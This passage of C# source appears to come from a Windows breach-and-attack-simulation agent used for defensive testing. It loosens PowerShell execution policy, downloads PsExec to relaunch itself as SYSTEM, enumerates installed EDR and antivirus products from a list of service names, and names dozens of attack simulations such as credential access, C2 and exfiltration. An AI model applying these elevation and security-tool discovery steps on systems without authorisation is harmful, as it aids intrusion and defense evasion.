        Console.WriteLine("Ã¢â€¢â€Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢â€”");
        Console.WriteLine("Ã¢â€¢â€˜        BAS Agent Ã¢â‚¬â€ Dependency Check          Ã¢â€¢â€˜");
        Console.WriteLine("Ã¢â€¢Å¡Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â");

        // Ã¢â€â‚¬Ã¢â€â‚¬ 1. PowerShell availability and execution policy Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
        bool psOk = false;
        try
        {
            var psiTest = new ProcessStartInfo("powershell.exe",
                "-NoProfile -NonInteractive -Command \"Write-Output OK\"")
            {
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                UseShellExecute        = false,
                CreateNoWindow         = true
            };
            using var p = Process.Start(psiTest)!;
            var output = await p.StandardOutput.ReadToEndAsync();
            await p.WaitForExitAsync();
            psOk = output.Contains("OK");
        }
        catch { }

        if (!psOk)
        {
            Console.WriteLine("  [!] PowerShell unavailable or blocked Ã¢â‚¬â€ attempting to set execution policy...");
            try
            {
                // Try to lift policy for LocalMachine
                var psiPolicy = new ProcessStartInfo("powershell.exe",
                    "-NoProfile -NonInteractive -Command \"Set-ExecutionPolicy RemoteSigned -Scope LocalMachine -Force\"")
                {
                    UseShellExecute = false,
                    CreateNoWindow  = true
                };
                using var p2 = Process.Start(psiPolicy)!;
                await p2.WaitForExitAsync();

                // Re-test
                var psiRetest = new ProcessStartInfo("powershell.exe",
                    "-NoProfile -NonInteractive -Command \"Write-Output OK\"")
                {
                    RedirectStandardOutput = true,
                    UseShellExecute        = false,
                    CreateNoWindow         = true
                };
                using var p3 = Process.Start(psiRetest)!;
                var out2 = await p3.StandardOutput.ReadToEndAsync();
                await p3.WaitForExitAsync();
                psOk = out2.Contains("OK");

                Console.WriteLine(psOk
                    ? "  [Ã¢Å“â€œ] PowerShell execution policy fixed (RemoteSigned)."
                    : "  [Ã¢Å“â€”] PowerShell still blocked after fix attempt. Patch installation may fail.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"  [Ã¢Å“â€”] Could not fix PowerShell policy: {ex.Message}");
            }
        }
        else
        {
            Console.WriteLine("  [Ã¢Å“â€œ] PowerShell: available and executable.");
        }

        // Ã¢â€â‚¬Ã¢â€â‚¬ 2. Windows Update service (wuauserv / UsoSvc) Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
        bool wuOk = false;
        try
        {
            using var sc = new System.ServiceProcess.ServiceController("wuauserv");
            if (sc.Status == System.ServiceProcess.ServiceControllerStatus.Running)
            {
                wuOk = true;
                Console.WriteLine("  [Ã¢Å“â€œ] Windows Update service (wuauserv): running.");
            }
            else
            {
                Console.WriteLine($"  [!] Windows Update service is {sc.Status}. Attempting to start...");
                try
                {
                    // Change startup type to Manual if Disabled
                    var psiSc = new ProcessStartInfo("sc.exe",
                        "config wuauserv start= demand")
                    {
                        UseShellExecute = false,
                        CreateNoWindow  = true
                    };
                    using var scp = Process.Start(psiSc)!;
                    await scp.WaitForExitAsync();

                    sc.Start();
                    sc.WaitForStatus(System.ServiceProcess.ServiceControllerStatus.Running,
                        TimeSpan.FromSeconds(15));
                    wuOk = sc.Status == System.ServiceProcess.ServiceControllerStatus.Running;
                    Console.WriteLine(wuOk
                        ? "  [Ã¢Å“â€œ] Windows Update service started successfully."
                        : "  [Ã¢Å“â€”] Could not start Windows Update service. Patch installation will not work.");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"  [Ã¢Å“â€”] Failed to start Windows Update service: {ex.Message}");
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"  [!] Could not check Windows Update service: {ex.Message}");
        }

        // Ã¢â€â‚¬Ã¢â€â‚¬ 3. WMIC (used for patch enumeration, deprecated on Win 11 22H2+) Ã¢â€â‚¬
        bool wmicOk = false;
        try
        {
            var psiWmic = new ProcessStartInfo("wmic.exe", "os get caption /value")
            {
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                UseShellExecute        = false,
                CreateNoWindow         = true
            };
            using var pw = Process.Start(psiWmic)!;
            var wmicOut = await pw.StandardOutput.ReadToEndAsync();
            await pw.WaitForExitAsync();
            wmicOk = wmicOut.Contains("Caption");
        }
        catch { }

        if (wmicOk)
        {
            Console.WriteLine("  [Ã¢Å“â€œ] WMIC: available (used for patch enumeration).");
        }
        else
        {
            // WMIC is deprecated on Win 11 22H2+. Registry fallback is used automatically.
            Console.WriteLine("  [~] WMIC: not available (Windows 11 22H2+). Patch enumeration via registry only.");
        }

        // Ã¢â€â‚¬Ã¢â€â‚¬ 4. .NET runtime self-contained check Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
        // This agent is published self-contained Ã¢â‚¬â€ .NET is bundled, no install needed.
        Console.WriteLine($"  [Ã¢Å“â€œ] .NET Runtime: {Environment.Version} (bundled Ã¢â‚¬â€ no install required).");

        // Ã¢â€â‚¬Ã¢â€â‚¬ 5. Admin privileges Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
        // Already confirmed above (auto-elevation succeeded to reach this point)
        Console.WriteLine("  [Ã¢Å“â€œ] Privileges: Running as Administrator.");

        Console.WriteLine("Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â");
        Console.WriteLine();
    }

    // ============================================================
    // NEW: Core Simulation Logic (Separated for re-usability)
    // ============================================================
    static async Task RunFullSimulation()
    {
        await SendHeartbeat("running");

        var report = new AgentReport
        {
            AgentId   = AgentId,
            Hostname  = Hostname,
            EnvironmentLabel = EnvironmentLabel,
            IpAddress = IpAddress,
            OsVersion = OsVersion,
            Username  = Username,
            StartedAt = DateTimeOffset.UtcNow,
            Status    = "Running"
        };

        // --- Detect installed security tools ---
        report.SecurityTools = await DetectSecurityTools();

        // --- SYSTEM STATE SNAPSHOT (pre-simulation baseline) ---
        Console.WriteLine("[>] Capturing pre-simulation system state snapshot...");
        var systemSnapshot = CaptureSystemSnapshot();
        Console.WriteLine($"[+] Snapshot captured: {systemSnapshot.RegistryKeys.Count} registry keys, {systemSnapshot.SystemFileHashes.Count} file hashes.");
        SimulationArtifactTracker.CaptureBaseline();

        // --- Execute all simulations — flush partial report to server after each category ---
        async Task Timed(string label, Task<SimulationCategory> t)
        {
            Console.WriteLine($"[>] Starting: {label}");
            var sw2 = System.Diagnostics.Stopwatch.StartNew();
            var result = await t;
            Console.WriteLine($"[+] Done:     {label} ({sw2.ElapsedMilliseconds}ms)");
            report.Categories.Add(result);
            await FlushPartialReport(report);
        }

        // Streaming variant: category is pre-registered so partial checks flush mid-simulation.
        // simFn receives the live category + a flush callback (fires after every check).
        async Task TimedStreamed(string label, Func<SimulationCategory, Func<Task>, Task> simFn)
        {
            Console.WriteLine($"[>] Starting: {label}");
            var sw2 = System.Diagnostics.Stopwatch.StartNew();
            var cat = new SimulationCategory();
            report.Categories.Add(cat);
            await FlushPartialReport(report); // push "in-progress" category header immediately
            Func<Task> flush = () => FlushPartialReport(report); // flush after every check
            await simFn(cat, flush);
            Console.WriteLine($"[+] Done:     {label} ({sw2.ElapsedMilliseconds}ms)");
            await FlushPartialReport(report);
        }

        await Timed("1.1 Phishing Payload",            Sim_1_1_PhishingPayload());
        await Timed("1.2 Malicious URL",               Sim_1_2_MaliciousURL());
        await Timed("2.1 LOLBins",                     Sim_2_1_LOLBins());
        await Timed("2.2 Defense Evasion",             Sim_2_2_DefenseEvasion());
        await Timed("2.3 Execution & Payload Delivery",Sim_2_3_ExecutionPayloadDelivery());
        await Timed("2.5 Defense Evasion (Advanced)",  Sim_2_5_DefenseEvasionAdvanced());
        await Timed("2.6 Polymorphic Payloads",        Sim_2_6_PolymorphicPayloads());
        await Timed("2.7 EDR/AV Evasion",              Sim_2_7_EDRAVEvasion());
        await Timed("2.8 User Behavior Simulation",    Sim_2_8_UserBehaviorSimulation());
        await Timed("2.9 Egress Filtering Validation", Sim_2_9_EgressFilteringValidation());
        await Timed("2.10 Parent PID Spoofing",        Sim_2_10_PPIDSpoofingValidation());
        await Timed("2.11 Sandbox Detection",          Sim_2_11_SandboxDetection());
        await Timed("3.1 Registry Persistence",        Sim_3_1_RegistryPersistence());
        await Timed("3.2 Service Autorun",             Sim_3_2_ServiceAutorun());
        await Timed("3.3 Boot, Tasks & Accounts",      Sim_3_3_PersistenceBootTasksAccounts());
        await Timed("4.  Privilege Escalation",        Sim_4_PrivilegeEscalation());
        await Timed("4.2 Priv Esc â€” Exploit/Token/UAC",Sim_4_2_PrivEscAdvanced());
        await Timed("4.3 Token Manipulation",          Sim_4_3_TokenManipulation());
        await Timed("5.  Credential Access",           Sim_5_CredentialAccess());
        await Timed("6.  Lateral Movement",            Sim_6_LateralMovement());
        await Timed("7.  C2",                         Sim_7_C2());
        await Timed("7.2 Network Steganography",       Sim_7_2_NetworkSteganography());
        await Timed("8.  Data Exfiltration",           Sim_8_DataExfiltration());
        await Timed("9.  Impact",                     Sim_9_Impact());
        await Timed("10. Post-Compromise",             Sim_10_PostCompromise());
        await Timed("11. Windows Patch",               Sim_11_WindowsPatch());
        await Timed("12. Dynamic Threat Intel",        Sim_12_DynamicThreatIntel());
        await Timed("13. In-Memory Execution",         Sim_13_InMemoryExecution());
        await TimedStreamed("15. Atomic Red Team (ART)",         Sim_15_AtomicRedTeam);
        await TimedStreamed("16. Caldera Abilities",            Sim_Caldera);
        await TimedStreamed("17. Prelude TTPs",                 Sim_Prelude);
        await TimedStreamed("18. Sigma Rule Coverage",          Sim_Sigma);
        await TimedStreamed("19. Stratus Red Team",             Sim_StratusRedTeam);
        await Timed("20. Infection Monkey",             Sim_InfectionMonkey());
        await Timed("21. Invoke-AtomicRedTeam",         Sim_InvokeART());
        await Timed("22. System State Integrity",       PostSimulationIntegrityCheck(systemSnapshot));

        report.CompletedAt = DateTimeOffset.UtcNow;

        // --- DELTA REPORTING ALGORITHM ---
        string cacheFile = ".bas_last_report.json";
        if (File.Exists(cacheFile))
        {
            try
            {
                string json = File.ReadAllText(cacheFile);
                var oldReport = JsonSerializer.Deserialize<AgentReport>(json, new JsonSerializerOptions { PropertyNameCaseInsensitive = true });
                if (oldReport != null)
                {
                    // Create a lookup of previously failed checks by Name
                    var oldFailures = oldReport.Categories
                        .SelectMany(c => c.Checks)
                        .Where(chk => chk.Result == CheckResult.Fail)
                        .Select(chk => chk.Name)
                        .ToHashSet();

                    // Compare current checks
                    foreach (var cat in report.Categories)
                    {
                        foreach (var chk in cat.Checks)
                        {
                            if (chk.Result == CheckResult.Fail)
                            {
                                // If it was already failing in the last report, it is NOT new
                                chk.IsNew = !oldFailures.Contains(chk.Name);
                            }
                            else
                            {
                                chk.IsNew = false;
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Could not parse last report for delta: {ex.Message}");
            }
        }
        else 
        {
            // First run: All fails are technically "new"
            foreach (var cat in report.Categories)
                foreach (var chk in cat.Checks)
                    chk.IsNew = chk.Result == CheckResult.Fail;
        }
        
        // Save current report for next time
        try
        {
            File.WriteAllText(cacheFile, JsonSerializer.Serialize(report));
        }
        catch { }

        report.Status = "Completed";
        await UploadReport(report);
        await SendHeartbeat("done");
        Console.WriteLine("[+] Simulation cycle finished and uploaded.");
    }

    static async Task FlushPartialReport(AgentReport report)
    {
        try
        {
            using var http = new HttpClient { Timeout = TimeSpan.FromSeconds(15) };
            var json = JsonSerializer.Serialize(report);
            await http.PostAsync($"{ServerUrl}/api/report",
                new StringContent(json, Encoding.UTF8, "application/json"));
            Console.WriteLine($"[~] Partial report flushed ({report.Categories.Count} categories).");
        }
        catch (Exception ex) { Console.WriteLine($"[~] Partial flush skipped: {ex.Message}"); }
    }

    // ============================================================
    // WIN32 — suppress OS dialogs during simulation
    // SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX
    // Prevents WER crash dialogs and "insert disk" prompts from blocking the process.
    // ============================================================
    [DllImport("kernel32.dll")] static extern uint SetErrorMode(uint uMode);
    const uint SEM_FAILCRITICALERRORS  = 0x0001;
    const uint SEM_NOGPFAULTERRORBOX   = 0x0002;
    const uint SEM_NOOPENFILEERRORBOX  = 0x8000;

    // ============================================================
    // ELEVATION HELPERS
    // ============================================================
    static bool IsAdmin()
    {
        using var id = System.Security.Principal.WindowsIdentity.GetCurrent();
        return new System.Security.Principal.WindowsPrincipal(id)
            .IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
    }

    static int ElevateAndRestart()
    {
        var psi = new ProcessStartInfo
        {
            FileName              = Environment.ProcessPath!,
            UseShellExecute       = true,
            Verb                  = "runas",            // triggers UAC
            RedirectStandardOutput = false,
            CreateNoWindow        = false
        };
        try { Process.Start(psi); }
        catch (System.ComponentModel.Win32Exception)
        {
            Console.Error.WriteLine("[BAS Agent] Elevation cancelled by user.");
        }
        return 1;                                       // original (non-elevated) process exits
    }

    static bool IsSystem()
    {
        using var id = System.Security.Principal.WindowsIdentity.GetCurrent();
        return id.IsSystem;
    }

    static void ElevateToSystemAndRestart()
    {
        Console.WriteLine("[BAS Agent] Attempting SYSTEM elevation via PsExec (on-prem fallback: will continue as Admin if unavailable)...");
        try
        {
            string psexecPath = Path.Combine(Path.GetTempPath(), "PsExec64.exe");
            if (!File.Exists(psexecPath))
            {
                using var client = new HttpClient();
                client.Timeout = TimeSpan.FromSeconds(10);
                var bytes = client.GetByteArrayAsync("https://live.sysinternals.com/PsExec64.exe").Result;
                File.WriteAllBytes(psexecPath, bytes);
            }

            string args = string.Join(" ", Environment.GetCommandLineArgs().Skip(1).Select(a => $"\"{a}\""));
            var psi = new ProcessStartInfo
            {
                FileName = psexecPath,
                Arguments = $"-accepteula -s -i \"{Environment.ProcessPath}\" {args}",
                UseShellExecute = true,
                CreateNoWindow = false
            };
            Process.Start(psi);
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"[BAS Agent] SYSTEM elevation unavailable: {ex.Message}");
            Console.WriteLine("[BAS Agent] Continuing as Administrator...");
        }
    }

    // ============================================================
    // SECURITY TOOL DETECTION
    // Discovers installed AV, EDR, Firewall and other security
    // products using WMI SecurityCenter2 + service/process checks.
    // ============================================================
    static async Task<List<SecurityTool>> DetectSecurityTools()
    {
        var tools = new List<SecurityTool>();
        var seen  = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        // Ã¢â€â‚¬Ã¢â€â‚¬ 1. WMI SecurityCenter2 (AV + Firewall registered with Windows) Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
        try
        {
            const string psScript = @"
$ns = 'root/SecurityCenter2'
$avs = Get-CimInstance -Namespace $ns -ClassName AntiVirusProduct  -ErrorAction SilentlyContinue
$fws = Get-CimInstance -Namespace $ns -ClassName FirewallProduct    -ErrorAction SilentlyContinue
$spw = Get-CimInstance -Namespace $ns -ClassName AntiSpywareProduct -ErrorAction SilentlyContinue
$all = @($avs) + @($fws) + @($spw) | Where-Object { $_ }
foreach ($p in $all) {
    $state  = $p.productState
    $active = ($state -band 0x1000) -ne 0
    $status = if ($active) { 'Active' } else { 'Inactive' }
    Write-Output ""$($p.displayName)|$($p.PSClass.Name)|$status""
}
";
            var ps1Path = Path.Combine(Path.GetTempPath(), "bas_sec_check.ps1");
            await File.WriteAllTextAsync(ps1Path, psScript);

            var psi = new ProcessStartInfo("powershell.exe",
                $"-NoProfile -NonInteractive -ExecutionPolicy Bypass -File \"{ps1Path}\"")
            {
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                UseShellExecute        = false,
                CreateNoWindow         = true
            };
            using var proc = Process.Start(psi)!;
            while (!proc.StandardOutput.EndOfStream)
            {
                var line = (await proc.StandardOutput.ReadLineAsync())?.Trim();
                if (string.IsNullOrEmpty(line)) continue;
                var parts = line.Split('|');
                if (parts.Length < 3) continue;
                var name   = parts[0].Trim();
                var cls    = parts[1].Trim();
                var status = parts[2].Trim();
                var type   = cls switch
                {
                    "AntiVirusProduct"    => "AV",
                    "FirewallProduct"     => "Firewall",
                    "AntiSpywareProduct"  => "AV",
                    _                     => "Other"
                };
                if (seen.Add(name.ToLower()))
                    tools.Add(new SecurityTool { Name = name, Vendor = "", Type = type, Status = status });
            }
            await proc.WaitForExitAsync();
            try { File.Delete(ps1Path); } catch { }
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"[!] WMI security scan failed: {ex.Message}");
        }


        // Ã¢â€â‚¬Ã¢â€â‚¬ 2. Known EDR / security service names Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
        var knownServices = new[]
        {
            // (ServiceName,              Display Name,                 Vendor,               Type)
            ("CSFalconService",           "CrowdStrike Falcon",         "CrowdStrike",        "EDR"),
            ("SentinelAgent",             "SentinelOne Agent",          "SentinelOne",        "EDR"),
            ("CbDefense",                 "VMware Carbon Black",        "VMware",             "EDR"),
            ("CylanceSvc",                "Cylance PROTECT",            "Cylance",            "AV/EDR"),
            ("WinDefend",                 "Windows Defender",           "Microsoft",          "AV"),
            ("Sense",                     "MS Defender for Endpoint",   "Microsoft",          "EDR"),
            ("SepMasterService",          "Symantec Endpoint",          "Broadcom",           "AV/EDR"),
            ("McShield",                  "McAfee VirusScan",           "McAfee",             "AV"),
            ("masvc",                     "McAfee Agent",               "McAfee",             "AV/EDR"),
            ("SAVService",                "Sophos Anti-Virus",          "Sophos",             "AV"),
            ("Sophos MCS Agent",          "Sophos Intercept X",         "Sophos",             "EDR"),
            ("KAVFS",                     "Kaspersky Endpoint",         "Kaspersky",          "AV/EDR"),
            ("epag",                      "Bitdefender Endpoint",       "Bitdefender",        "AV/EDR"),
            ("esets_daemon",              "ESET Endpoint Security",     "ESET",               "AV"),
            ("MBAMService",               "Malwarebytes",               "Malwarebytes",       "AV"),
            ("TaniumClient",              "Tanium Client",              "Tanium",             "EDR"),
            ("xagt",                      "FireEye HX Agent",           "FireEye",            "EDR"),
            ("ds_agent",                  "Trend Micro Deep Security",  "Trend Micro",        "AV/EDR"),
            ("PandaAetherAgent",          "Panda Adaptive Defense",     "WatchGuard",         "EDR"),
            ("CiscoAMP",                  "Cisco Secure Endpoint",      "Cisco",              "EDR"),
            ("CarbonBlack",               "Carbon Black Cloud",         "VMware",             "EDR"),
            ("WazuhSvc",                  "Wazuh Agent",                "Wazuh",              "HIDS"),
            ("OssecSvc",                  "OSSEC Agent",                "OSSEC",              "HIDS"),
            ("DlpAgentService",           "Symantec DLP Agent",         "Broadcom",           "DLP"),
            ("mfefire",                   "McAfee Firewall",            "McAfee",             "Firewall"),
        };

        foreach (var (svcName, displayName, vendor, type) in knownServices)
        {
            try
            {
                using var sc = new System.ServiceProcess.ServiceController(svcName);
                var running = sc.Status == System.ServiceProcess.ServiceControllerStatus.Running;
                if (seen.Add(displayName.ToLower()))
                    tools.Add(new SecurityTool
                    {
                        Name   = displayName,
                        Vendor = vendor,
                        Type   = type,
                        Status = running ? "Active" : "Inactive"
                    });
            }
            catch { /* service doesn't exist on this machine */ }
        }

        // Ã¢â€â‚¬Ã¢â€â‚¬ 3. Windows Defender details via registry Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
        // Already caught by WMI, but add real-time protection state if not yet present
        try
        {
            using var key = Registry.LocalMachine.OpenSubKey(
                @"SOFTWARE\Microsoft\Windows Defender\Real-Time Protection");
            if (key != null)
            {
                var disabled = (key.GetValue("DisableRealtimeMonitoring") as int?) ?? 0;
                var defName  = "Windows Defender";
                if (seen.Add(defName.ToLower()))
                    tools.Add(new SecurityTool
                    {
                        Name   = defName,
                        Vendor = "Microsoft",
                        Type   = "AV",
                        Status = disabled == 0 ? "Active" : "Inactive"
                    });
            }
        }
        catch { }

        Console.WriteLine($"[*] Detected {tools.Count} security tool(s).");
        return tools;
    }

    // ============================================================
    // HTTP HELPERS
    // ============================================================
    static async Task SendHeartbeat(string status)
    {
        var payload = new
        {
            AgentId = AgentId,
            Hostname = Hostname,
            IpAddress = IpAddress,
            OsVersion = OsVersion,
            Username = Username,
            Status = status
        };
        try
        {
            using var http = new HttpClient();
            var json = JsonSerializer.Serialize(payload);
            await http.PostAsync($"{ServerUrl}/api/heartbeat",
                new StringContent(json, Encoding.UTF8, "application/json"));
        }
        catch (Exception ex) { Console.Error.WriteLine($"[BAS] Heartbeat failed: {ex.Message}"); }
    }

    static async Task UploadReport(AgentReport report)
    {
        try
        {
            using var http = new HttpClient { Timeout = TimeSpan.FromSeconds(30) };
            var json = JsonSerializer.Serialize(report);
            var resp = await http.PostAsync($"{ServerUrl}/api/report",
                new StringContent(json, Encoding.UTF8, "application/json"));
            resp.EnsureSuccessStatusCode();
            Console.WriteLine("[BAS Agent] Report uploaded successfully.");
        }
        catch (Exception ex) { Console.Error.WriteLine($"[BAS] Upload failed: {ex.Message}"); }
    }

    // ============================================================
    // GENERIC SIMULATION RUNNER
    // Wraps each individual check so timing & exception handling
    // are consistent everywhere.
    // ============================================================
    static async Task<SimCheck> RunCheck(string name, string technique,
        Func<Task<(CheckResult result, string detail, string remediation)>> body,
        int timeoutSeconds = 45)
    {
        var sw = Stopwatch.StartNew();
        CheckResult res = CheckResult.Skipped;
        string detail = "", rem = "";
        try
        {
            var bodyTask    = body();
            var timeoutTask = Task.Delay(TimeSpan.FromSeconds(timeoutSeconds));
            var winner      = await Task.WhenAny(bodyTask, timeoutTask);

            if (winner == timeoutTask)
            {
                // A dialog or security control blocked execution — do not wait for human input
                res    = CheckResult.Blocked;
                detail = $"Check exceeded {timeoutSeconds}s timeout. A dialog, UAC prompt, or security control likely blocked automated execution.";
                rem    = "Investigate which control interrupted this technique and verify the policy is intentional.";
            }
            else
            {
                (res, detail, rem) = await bodyTask;
            }
        }
        catch (Exception ex)
        {
            res    = CheckResult.Fail;
            detail = $"Exception during simulation: {ex.Message}";
            rem    = "Investigate agent-side error.";
        }
        sw.Stop();
        return new SimCheck { Name = name, TechniqueId = technique, Result = res, Details = detail, Remediation = rem, DurationMs = sw.ElapsedMilliseconds };
    }

    /// <summary>
    /// Waits for <paramref name="p"/> to exit; kills it if <paramref name="timeoutMs"/> elapses.
    /// </summary>
    static async Task WaitOrKillAsync(Process p, int timeoutMs = 25_000)
    {
        using var cts = new CancellationTokenSource(timeoutMs);
        try
        {
            await p.WaitForExitAsync(cts.Token);
        }
        catch (OperationCanceledException)
        {
            try { p.Kill(true); } catch { }
        }
    }

    // ============================================================
    // 1.1  PHISHING PAYLOAD EXECUTION
    // Tests: AV/EDR file-type scanning, AMSI, script blocking
    // ============================================================
    static async Task<SimulationCategory> Sim_1_1_PhishingPayload()
    {
        var cat = new SimulationCategory { Name = "1.1 Phishing Payload Execution", Phase = "Initial Access" };

        // --- Malicious attachment execution (doc/xls/pdf/iso) ---
        cat.Checks.Add(await RunCheck("Malicious attachment execution (doc, xls, pdf, iso)", "T1566.001", async () =>
        {
            // Create a benign .doc file in temp, then check if Windows Smart App Control or Defender flags the action
            string tmp = Path.Combine(Path.GetTempPath(), "bas_test_attachment.doc");
            File.WriteAllText(tmp, "BAS simulation Ã¢â‚¬â€ not a real document payload.");
            bool blocked = !File.Exists(tmp); // if something deleted it between write and check Ã¢â€ â€™ blocked
            File.Delete(tmp);
            if (blocked)
                return (CheckResult.Pass, "AV/EDR blocked simulated attachment drop in temp.", "Ã¢â‚¬â€");
